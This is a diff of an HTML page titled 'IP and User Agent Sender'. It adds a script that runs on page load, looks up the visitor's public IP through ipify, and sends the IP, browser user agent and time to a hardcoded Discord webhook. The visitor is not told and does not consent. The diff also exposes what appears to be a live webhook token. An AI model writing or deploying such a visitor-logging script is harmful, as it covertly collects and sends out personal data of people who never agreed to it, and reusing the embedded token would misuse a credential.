@@ -1,6 +1,54 @@
 <!DOCTYPE html>
 <html>
-    <form method="post" action="send_to_discord.php">
-      <input type="submit" value="Send data to Discord">
-    </form>
+<head>
+  <title>IP and User Agent Sender</title>
+</head>
+<body>
+  <h1>IP and User Agent Sender</h1>
+
+  <script>
+    // Function to send data to Discord webhook
+    function sendToDiscord(ip, userAgent, dateTime) {
+      var webhookUrl = "https://discord.com/api/webhooks/1116840690811412623/ljBC7BcAaKj4orxzDFcJvID4CSF5Q7Sir3678YqqrAl-I9w3EtXW7cbTpScp7144Elxr";
+
+      // Create a new XMLHttpRequest
+      var request = new XMLHttpRequest();
+      request.open("POST", webhookUrl);
+
+      // Set the content type to application/json
+      request.setRequestHeader("Content-Type", "application/json");
+
+      // Build the payload JSON data with fancy Discord formatting
+      var payload = {
+        "content": "```IP: " + ip + "\nUser Agent: " + userAgent + "\nDate and Time: " + dateTime + "```"
+      };
+
+      // Convert payload to JSON string
+      var payloadJson = JSON.stringify(payload);
+
+      // Send the request
+      request.send(payloadJson);
+    }
+
+    // Get the IP address, user agent, and current date and time and send them to Discord
+    window.addEventListener("load", function() {
+      // Get the IP address using a free API
+      fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+          var ip = data.ip;
+
+          // Get the user agent
+          var userAgent = navigator.userAgent;
+
+          // Get the current date and time
+          var dateTime = new Date().toLocaleString();
+
+          // Call the function to send data to Discord
+          sendToDiscord(ip, userAgent, dateTime);
+        })
+        .catch(error => console.error("Error:", error));
+    });
+  </script>
+</body>
 </html>
